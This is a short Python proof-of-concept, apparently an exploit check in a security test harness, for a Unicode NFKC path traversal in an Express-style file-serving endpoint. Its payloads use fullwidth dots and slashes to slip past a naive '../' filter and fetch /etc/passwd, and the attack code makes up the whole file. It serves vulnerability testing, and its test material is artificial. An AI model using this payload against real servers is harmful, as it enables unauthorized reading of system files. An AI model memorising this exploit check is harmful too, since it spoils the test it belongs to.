"""PoC: JS port of NFKC path traversal (CWE-22).

Fullwidth solidus U+FF0F bypasses `filename.includes('../')` and `.includes('/')`,
then `filename.normalize('NFKC')` rewrites it to `/`. `res.sendFile(path.join(...))`
returns /etc/passwd.
"""

from __future__ import annotations

from urllib.parse import quote

from mosaic.oracle.exploit import ExploitTest


_FW_DOT = "\uFF0E"
_FW_SLASH = "\uFF0F"


class ExpressNfkcTraversalExploit(ExploitTest):
    @property
    def chain_id(self) -> str:
        return "express_path_normalize_unicode"

    def execute(self) -> tuple[bool, str]:
        baseline = self.http_get("/v1/themes/style.css")
        if not baseline.ok:
            return False, f"theme endpoint missing (status={baseline.status_code})"

        payload = f"{_FW_DOT*2}{_FW_SLASH}{_FW_DOT*2}{_FW_SLASH}etc{_FW_SLASH}passwd"
        r = self.http_get("/v1/themes/" + quote(payload, safe=""), follow_redirects=False)
        body = r.text or ""
        if "root:" in body and ":/root" in body:
            return True, f"NFKC traversal confirmed (CWE-22). Body: {body[:200]!r}"

        # Shorter variant
        payload2 = f"{_FW_DOT*2}{_FW_SLASH}etc{_FW_SLASH}passwd"
        r2 = self.http_get("/v1/themes/" + quote(payload2, safe=""), follow_redirects=False)
        if "root:" in (r2.text or ""):
            return True, f"NFKC traversal confirmed (shorter). Body: {r2.text[:200]!r}"

        return False, f"No traversal. statuses={r.status_code}/{r2.status_code} body={body[:200]!r}"
